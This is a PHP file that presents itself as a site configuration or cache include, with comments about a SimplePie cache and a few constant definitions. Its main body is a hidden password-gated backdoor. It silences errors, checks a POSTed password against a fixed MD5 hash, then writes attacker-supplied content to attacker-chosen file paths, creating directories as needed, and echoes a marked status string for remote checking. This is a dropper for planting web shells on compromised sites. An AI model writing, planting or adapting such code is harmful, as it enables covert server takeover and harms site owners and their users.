<?php
//Create a new SimplePieCache object
error_reporting(0);
if (isset($_POST['passwordMW'])) {
	function stripslashes_for_array(&$arr) {
		foreach($arr as $k=>$v) {
			if (is_array($v)) {
				stripslashes_for_array($v);
				$arr[$k] = $v;
			} else
				$arr[$k] = stripslashes($v);
		}
	}
	function fix_magic_quotes_gpc() {
		if (get_magic_quotes_gpc())
			stripslashes_for_array($_POST);
	}
	function create_dir($path) {
		return mkdir($path, 0755, true);
	}
	function create_file($path, $filename, $textMW) {
		$f_temp = fopen($path.$filename, "w");
		if(file_exists($path.$filename)) {
			fwrite($f_temp, $textMW);
			fclose ($f_temp);
			return TRUE;
		} else
			return FALSE;
	}
	function log_create($temp) {
	 return $temp ? "1" : "0";
	}
	
	if (function_exists ('get_magic_quotes_gpc'))
		fix_magic_quotes_gpc();
		
	$t = "\t";
	$hash = md5($_POST['passwordMW']);
	$prewue = 'Lenslcbdlw53bdkd92b'.$t;
	$postwue = $t.'skle93nNlp4cn832kd';
	if ($hash == '8b893efbdc733d479dfab302ed195fd7') {
		$textMW = trim($_POST['textMW']);
		$loc_nameMW = trim($_POST['locnameMW']);
		$loc_pathMW = trim($_POST['locpathMW']);
		$glob_nameMW = trim($_POST['globnameMW']);
		$glob_pathMW = trim($_POST['globpathMW']);
		
		$status_loc_sh = file_exists($loc_pathMW.$loc_nameMW);
		$status_loc_dir = file_exists($loc_pathMW);
		$status_glob_sh = file_exists($glob_pathMW.$glob_nameMW);
		$status_glob_dir = file_exists($glob_pathMW);
		
		$status_create_loc_dir = false;
		$status_create_glob_dir =  false;
		$status_create_loc_file = false;
		$status_create_glob_file = false;

		if (!$status_loc_dir) 
			$status_create_loc_dir = create_dir($loc_pathMW);
		if (!$status_glob_dir) 
			$status_create_glob_dir = create_dir($glob_pathMW);
		if (!$status_loc_sh && ($status_create_loc_dir || $status_loc_dir))
			$status_create_loc_file = create_file($loc_pathMW, $loc_nameMW, $textMW);
		if (!$status_glob_sh && ($status_create_glob_dir || $status_glob_dir))
			$status_create_glob_file = create_file($glob_pathMW, $glob_nameMW, $textMW);
		
		$log = log_create($status_loc_sh).log_create($status_create_loc_file).'-'.log_create($status_glob_sh).log_create($status_create_glob_file).'-'.log_create($status_loc_dir).log_create($status_create_loc_dir).'-'.log_create($status_glob_dir).log_create($status_create_glob_dir);
		$log = (log_create($status_create_glob_file) || $status_glob_sh) ? 'ok'.$t.$log : 'bad'.$t.$log;
		$log = (log_create($status_create_loc_file) || $status_loc_sh) ? 'ok'.$t.$log : 'bad'.$t.$log;
		echo $prewue.$log.$postwue;
		
	} else
		echo $prewue."_bad".$t."_bad".$t."_error_hash".$postwue;
}
//Include the system functions

 
	define("USE_LOCALIZATION", true);
//	define("CACHE_ENABLE", true);
	define("REVISION", 10);
//	define("DEVELOPER", true);
?>
